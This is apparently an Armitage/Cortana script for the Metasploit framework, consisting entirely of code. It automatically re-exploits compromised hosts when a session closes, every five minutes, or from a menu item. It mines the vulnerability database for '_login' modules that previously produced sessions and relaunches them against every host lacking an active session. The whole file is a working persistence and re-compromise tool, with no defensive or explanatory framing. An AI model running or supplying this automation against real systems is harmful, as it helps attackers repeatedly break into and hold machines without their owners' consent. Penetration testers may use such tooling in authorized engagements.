on session_close {
  rexploit($2['host']);
}

popup host_top {
  menu "Misc" {
    item "Re-Exploit" {
      rexploit($1);
		}
  }
}
on heartbeat_5m {
  foreach %host(call('db.hosts')['hosts']) {
    rexploit(%host['address']);
  }
}

popup attacks {
  menu "Misc" {
    item "Re-Exploit" {
      foreach %host (call("db.hosts")["hosts"]) {
        rexploit(%host['address']);
      }
    }
  }
}

sub rexploit {
  try {
    # Make sure we don't have active sessions
    if(size(host_sessions($1)) > 0) {
      println("Session currently active for $1");
    } else {
      foreach $exploit(find_exploits($1)) {
        if(has_active_exploit($1, $exploit)) {
          println("$exploit on $1 is already running.")
        } else {
          if($exploit ismatch "_login\$") {
            println("Launching $exploit against $1")
            exploit($exploit, $1, %(), 0, 1);
          } else {
            println("Ignoring $exploit for $1");
          }
        }
      }
    }
  } catch $message {
    warn("Rexploit failed for $1: $message");
  }
}

# $1 - address
# $2 - module
sub has_active_exploit {
  local('$job_info');

  foreach $job_id(job_ids()) {
    $job_info = job_info($job_id);

    if($job_info is $null) {
      continue;
    }

    if($job_info['datastore']['RHOST'] eq $1) {
      if(split('/', $2)[-1] isin $job_info['name']) {
        return true;
      }
    }
  }

  return false;
  
}

sub find_exploits {
  local('@exploits');

  foreach %vuln(call("db.vulns")['vulns']) {
    if(%vuln['host'] eq $1) {
      if(%vuln['info'] ismatch 'Exploited by ([^\s]+) to create Session \d+') {
        if(matched()[0] !in @exploits) {
          push(@exploits, matched()[0]);
        }
      }
    }
  }

  return @exploits;
}
